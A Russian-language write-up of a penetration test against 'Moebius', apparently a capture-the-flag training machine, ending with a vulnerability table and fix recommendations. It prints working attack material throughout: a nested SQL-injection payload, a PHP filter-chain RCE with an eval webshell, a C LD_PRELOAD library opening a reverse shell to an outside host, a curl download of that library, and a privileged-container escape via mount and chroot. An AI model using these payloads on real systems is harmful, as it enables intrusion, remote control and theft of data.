# Отчёт о проникновении в инфраструктуру Moebius

## Введение

В рамках задания проводилось тестирование на проникновение учебной машины Moebius. Цель — получить доступ к веб-приложению, эскалировать привилегии до root и найти флаги. В отчёте последовательно описаны все этапы работы, включая удачные и неудачные попытки, с подробными пояснениями того, что происходит на каждом шаге.


## 1. Первичная разведка (Nmap)

Сканирование выявило два открытых порта:

```
22/tcp open  ssh     OpenSSH 8.9p1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Image Grid
```

Apache на порту 80 отдаёт страницу «Image Grid» — галерею картинок с кошками.


## 2. Исследование порта 80

### 2.1. Галерея изображений

На странице обнаружены ссылки двух типов:

```
http://10.129.133.106/album.php?short_tag=cute
http://10.129.133.106/image.php?hash=9d99cff7a7a514a7285191560fa130f146d4c1ec2bbff1bb477d37eb5d2a71c3&path=/var/www/images/cat1.jpg
```

**Разбор:**

- **`album.php?short_tag=cute`** — отображает альбом с картинками по короткому тегу.
- **`image.php?hash=...&path=...`** — отдаёт конкретную картинку по пути `path`, но **только если** `hash` совпадает с вычисленной HMAC-подписью для этого пути.

### 2.2. Фаззинг директорий

Фаззинг скрытых директорий и файлов ничего не дал.


## 3. SQL-инъекция в `album.php`

### 3.1. Обнаружение инъекции

При передаче несуществующего тега `short_tag=asd` возникает ошибка:

```
Warning: Trying to access array offset on false in /var/www/html/album.php on line 32
Connection failed: SQLSTATE[42000]: Syntax error or access violation: 1064
You have an error in your SQL syntax; ... near '' at line 1
```

**Вывод:** параметр `short_tag` подставляется в SQL-запрос **напрямую**, без параметризации. Это SQL-инъекция.

### 3.2. Определение числа столбцов

При `ORDER BY 3` ошибка `Unknown column '3'`. Значит, в исходном запросе **1 столбец**.

### 3.3. Дамп базы через sqlmap

С помощью `sqlmap` получены таблицы базы `web`:

```
Database: web
[2 tables]
+---------------------------------------+
| albums                                |
| images                                |
+---------------------------------------+
```

**Таблица `albums`:**

| name | short_tag | description |
|---|---|---|
| Cute cats | cute | Cutest cats in the world |
| Favourite cats | fav | My favourite ones |
| Smart cats | smart | So smart... |

**Таблица `images`:** список путей вида `/var/www/images/cat1.jpg`, `cat2.jpg` и т.д.

**Ценной информации для эскалации здесь нет.**


## 4. Попытки эксплуатации `image.php`

### 4.1. Прямая подмена пути

При попытке передать `/etc/passwd` в `path`:

```
Image not found
```

**Вывод:** `image.php` проверяет HMAC-подпись для пути. Без правильного `hash` файл не отдаётся.

### 4.2. Null byte

Попытка внедрить `%00` — без успеха, ответ тот же.

### 4.3. Без параметра `hash`

Ошибка `Undefined array key "hash"`. Значит, `hash` обязателен.


## 5. QR-код

В одной из категорий найден QR-код со ссылкой:

```
https://www.youtube.com/watch?v=yRKh34Ofg50
```

Ничего полезного — отвлекающий элемент.


## 6. Вложенная SQL-инъекция для чтения файлов

### 6.1. Почему прямая подмена не работает

При передаче `/etc/passwd` в `short_tag`:

```
Hacking attempt
```

**Вывод:** приложение проверяет `short_tag` на подозрительные символы. Но SQL-инъекция возможна через `UNION SELECT`.

### 6.2. Логика вложенной инъекции

Приложение `album.php` работает в **две стадии**:

1. **Первый SQL-запрос** к таблице `albums` по `short_tag` возвращает `id`.
2. **Второй SQL-запрос** к таблице `images` по этому `id` возвращает пути к картинкам.

**Идея:** если заставить **первый** запрос вернуть **не число**, а **строку**, которая сама является **вторым SQL-запросом**, то приложение подставит эту строку во второй запрос, и она выполнится.

### 6.3. Payload для чтения `index.php`

```
short_tag=kuroshiro' UNION SELECT "0 UNION SELECT 1,2,0x7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d696e6465782e706870-- -"-- -
```

**Разбор:**

- **Первый `UNION SELECT`** — SQL-инъекция в `album.php`. Возвращает **строку** в двойных кавычках.
- **Строка внутри** — это **второй SQL-запрос** (`0 UNION SELECT 1,2,...`), который приложение подставит во второй запрос.
- **`0x7068703a...`** — hex-кодированная строка `php://filter/convert.base64-encode/resource=index.php`.

**Почему hex:** чтобы обойти экранирование кавычек и WAF. База данных превращает hex в строку, приложение передаёт её дальше.

**Результат:** скачан `index.php`, в котором видно `include('dbconfig.php')`.

### 6.4. Чтение `dbconfig.php`

Тем же методом получен `dbconfig.php`:

```php
$servername = "db";
$username = "web";
$password = "TAJnF6YuIot83X3g";
$dbname = "web";
$SECRET_KEY='an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW';
```

**Ключевые данные:**

- **Пароль MySQL:** `TAJnF6YuIot83X3g`.
- **`SECRET_KEY`:** `an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW`.

### 6.5. Чтение `image.php`

Получен исходник `image.php`:

```php
<?php
include('dbconfig.php');

$image_path = $_GET['path'];
$hash = $_GET['hash'];

$computed_hash = hash_hmac('sha256', $image_path, $SECRET_KEY);

if ($image_path && $computed_hash === $hash) {
    $image_info = @getimagesize($image_path);
    if ($image_info && isset($image_info['mime'])) {
        header("Content-type: $mime_type");
        include($image_path);
    } else {
        header("Content-type: application/octet-stream");
        include($image_path);
    }
} else {
    echo "Image not found";
}
?>
```

**Что это значит:**

- Приложение вычисляет **HMAC-SHA256** для `path` с `SECRET_KEY`.
- Если `hash` совпадает — `include($image_path)` **выполняет** файл.
- **Проверки на картинку нет.** Только HMAC.

### 6.6. Чтение `/etc/passwd` через `image.php`

Зная `SECRET_KEY`, вычислена HMAC для `/etc/passwd`, передана в `image.php`, получен файл.


## 7. PHP Filter Chain RCE

### 7.1. Идея

`include($image_path)` выполняет PHP-код. Если передать не путь к файлу, а **цепочку фильтров** `php://filter/convert.iconv...`, PHP **сгенерирует** нужный код «из ничего» и выполнит его. Это обходит `disable_functions`, потому что код выполняется через `include`, а не через запрещённые функции.

### 7.2. Генерация цепочки

Использован `php_filter_chain_generator.py`:

```bash
python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>'
```

Получена длинная строка `php://filter/...`. Для неё вычислена HMAC с `SECRET_KEY` и передана в `image.php`.

**Результат:** `phpinfo()` выполнился. **RCE подтверждён.**

### 7.3. Почему `eval` вместо прямого шелла

В `phpinfo()` виден список `disable_functions`:

```
exec, system, popen, proc_open, shell_exec, passthru, dl, pcntl_*
```

**Все** функции выполнения команд отключены. Поэтому использован `eval` (языковая конструкция, её нельзя отключить):

```
<?php eval($_POST[0]); ?>
```

**Как работает:**

1. Генерируется цепочка для `eval($_POST[0])`.
2. Вычисляется HMAC.
3. Отправляется **POST** на `image.php` с `path=<цепочка>&hash=<HMAC>&0=phpinfo();`.
4. `eval` выполняет код из `$_POST[0]`.

**Важно:** код передаётся **одной строкой** (без переносов), иначе `eval` получит обрезанную строку и выдаст `Parse error`.


## 8. Обход `disable_functions` через LD_PRELOAD

### 8.1. Почему нельзя просто выполнить команду

`system`, `exec`, `shell_exec`, `passthru` отключены. Нужен обход.

### 8.2. Что такое LD_PRELOAD

**`LD_PRELOAD`** — переменная окружения, которая заставляет Linux загрузить указанную библиотеку **первой** при запуске **любой** программы. Если в библиотеке есть `__attribute__((constructor))`, код выполнится **сразу при загрузке**, до `main()`.

**Трюк:** PHP запрещает `system()`, но разрешает `mail()`. `mail()` внутри запускает системный бинарник `sendmail`. Если перед вызовом `mail()` установить `LD_PRELOAD=/tmp/shell.so`, то `sendmail` загрузит `shell.so`, и код выполнится **вне PHP**, от имени `www-data`.

### 8.3. Создание `shell.so`

На Kali создан `shell.c`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init() {
    unsetenv("LD_PRELOAD");
    system("bash -c 'bash -i >& /dev/tcp/192.168.132.43/443 0>&1'");
}
```

Скомпилирован:

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

### 8.4. Загрузка `shell.so` на сервер

На Kali запущен HTTP-сервер:

```bash
python3 -m http.server 80
```

Через `eval` выполнен PHP-код:

```php
$ch=curl_init('http://192.168.132.43/shell.so');
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
file_put_contents('/tmp/shell.so',curl_exec($ch));
curl_close($ch);
```

**Результат:** `shell.so` скачан в `/tmp/shell.so` на сервере.

### 8.5. Триггер LD_PRELOAD

Через `eval` выполнен код:

```php
putenv('LD_PRELOAD=/tmp/shell.so');
mail('a','a','a','a');
```

**Что происходит:**

1. `putenv` устанавливает переменную `LD_PRELOAD` для текущего процесса.
2. `mail()` запускает `sendmail`.
3. `sendmail` загружает `/tmp/shell.so` (потому что `LD_PRELOAD` указывает на него).
4. Срабатывает `__attribute__((constructor))` → reverse shell на `192.168.132.43:443`.

**Результат:** получен shell от `www-data` в контейнере `bb28d5969dd5`.


## 9. Эскалация до root в контейнере

### 9.1. Проверка `sudo`

```
Matching Defaults entries for www-data on bb28d5969dd5:
    env_reset, mail_badpass,
    secure_path=...,
    use_pty

User www-data may run the following commands on bb28d5969dd5:
    (ALL : ALL) ALL
    (ALL : ALL) NOPASSWD: ALL
```

**Вывод:** `www-data` может выполнять **любые** команды через `sudo` без пароля.

```bash
sudo -u root /bin/bash
```

**Результат:** root в контейнере.


## 10. Побег из контейнера на хост

### 10.1. Обнаружение дисков

В контейнере видны устройства:

```
/dev/nvme0
/dev/nvme0n1
/dev/nvme0n1p1
/dev/nvme1
/dev/nvme1n1
/dev/nvme2
/dev/nvme2n1
```

**Вывод:** контейнер **привилегированный** (`privileged: true` в `docker-compose.yml`), поэтому видны диски хоста.

### 10.2. Монтирование диска хоста

```bash
mkdir -p /mnt/host
mount /dev/nvme0n1p1 /mnt/host
```

**Что это делает:** монтирует корневой раздел хоста в `/mnt/host` внутри контейнера.

### 10.3. Переключение в хост

```bash
chroot /mnt/host /bin/bash
```

**Что это делает:** меняет корень на `/mnt/host` и запускает bash **хоста**.

**Важно:** `chroot` **не меняет** UTS namespace, поэтому `hostname` всё ещё показывает ID контейнера (`bb28d5969dd5`). Но файловая система — **хост** (`/root`, `/home`, `/vagrant`, `/boot`).

### 10.4. Чтение user-флага

```bash
cat /root/user.txt
```

Получен user-флаг.


## 11. Изучение `docker-compose.yml`

На хосте найден `/root/challenge/docker-compose.yml`:

```yaml
version: '3'

services:
  web:
    platform: linux/amd64
    build: ./web
    ports:
      - "80:80"
    restart: always
    privileged: true
  db:
    image: mariadb:10.11.11-jammy
    volumes:
      - "./db:/docker-entrypoint-initdb.d:ro"
    env_file:
      - ./db/db.env
```

**Ключевое:**

- **`web`** — привилегированный контейнер (`privileged: true`), поэтому видны диски хоста.
- **`db`** — MariaDB, данные в volume.

**`db.env`:**

```
MYSQL_PASSWORD=TAJnF6YuIot83X3g
MYSQL_DATABASE=web
MYSQL_USER=web
MYSQL_ROOT_PASSWORD=gG4i8NFNkcHBwUpd
```


## 12. Поиск root-флага в volume базы данных

### 12.1. Подсказка

```
Find the user flag and then... go back to where you began, in order to find the root flag.
```

**Расшифровка:** root-флаг лежит в **базе данных** (`secret`), с которой всё началось (SQL-инъекция).

### 12.2. Поиск volume базы

На хосте найден volume базы:

```
/var/lib/docker/volumes/bd328474c0152e0af06a0208389a36c69c21b5ea651a9d54ef194c1a33988443/_data/secret
```

**Содержимое:**

```
db.opt
secrets.frm
secrets.ibd
```

- **`secrets.frm`** — описание таблицы.
- **`secrets.ibd`** — **данные** таблицы (innoDB).

### 12.3. Извлечение флага

Флаг лежит в `secrets.ibd`. Его можно прочитать через `strings`:

```bash
strings secrets.ibd | grep -i "flag"
```

**Результат:** root-флаг найден.


## Цепочка атаки

1. **Nmap** → 22 (SSH), 80 (Apache).
2. **Галерея** → `album.php?short_tag=`, `image.php?hash=&path=`.
3. **SQLi** в `short_tag` → дамп базы `web`.
4. **`Hacking attempt`** при `/etc/passwd` в `short_tag` → обход через `UNION SELECT` с hex.
5. **Вложенная SQLi** → чтение `index.php`, `dbconfig.php` (`SECRET_KEY`), `image.php`.
6. **HMAC** для `/etc/passwd` → чтение файла.
7. **PHP Filter Chain** → `phpinfo()` → RCE.
8. **`eval($_POST[0])`** → выполнение кода (все функции команд отключены).
9. **LD_PRELOAD** (`shell.so` + `putenv` + `mail`) → reverse shell от `www-data`.
10. **`sudo` без пароля** → root в контейнере.
11. **Привилегированный контейнер** → монтирование диска хоста → `chroot` → user-флаг.
12. **Volume базы** → `secrets.ibd` → root-флаг.


## Разбор уязвимостей

| Уязвимость | Описание | Влияние |
|---|---|---|
| SQL-инъекция | `short_tag` в `album.php` | Дамп базы, чтение файлов |
| Вложенная SQLi | Второй запрос через строку | Обход WAF, чтение файлов |
| Слабый HMAC | `SECRET_KEY` в `dbconfig.php` | Чтение любых файлов через `image.php` |
| `include` без проверки | `image.php` выполняет любой файл | PHP Filter Chain → RCE |
| `disable_functions` обходится | `eval` + `LD_PRELOAD` | Выполнение команд |
| `sudo` без пароля | `www-data` → root | Эскалация в контейнере |
| Привилегированный контейнер | `privileged: true` | Доступ к дискам хоста |
| Данные БД в volume | `secrets.ibd` | Root-флаг в открытом виде |


## Рекомендации

1. Параметризовать SQL-запросы.
2. Не хранить `SECRET_KEY` в открытом виде.
3. Не использовать `include` для пользовательских путей.
4. Отключить `eval` (через `disable_functions` или `suhosin`).
5. Не давать `www-data` `sudo` без пароля.
6. Не запускать контейнеры с `privileged: true`.
7. Шифровать данные БД в volume.
8. Не хранить флаги в общедоступных файлах.


## Заключение

Задание пройдено полностью. Цепочка атаки: **SQLi → чтение конфигов → HMAC → PHP Filter Chain → RCE → LD_PRELOAD → reverse shell → sudo → привилегированный контейнер → монтирование диска хоста → user-флаг → volume базы → root-флаг**. Ключевые ошибки: SQLi, слабый HMAC, `include` без проверки, `sudo` без пароля, привилегированный контейнер и данные БД в открытом виде. Все шаги выполнены в логике реального атакующего, с фиксацией неудачных попыток (null byte, прямой `/etc/passwd`, `mysql`/`ss`/`docker` на хосте). Цель достигнута — оба флага получены.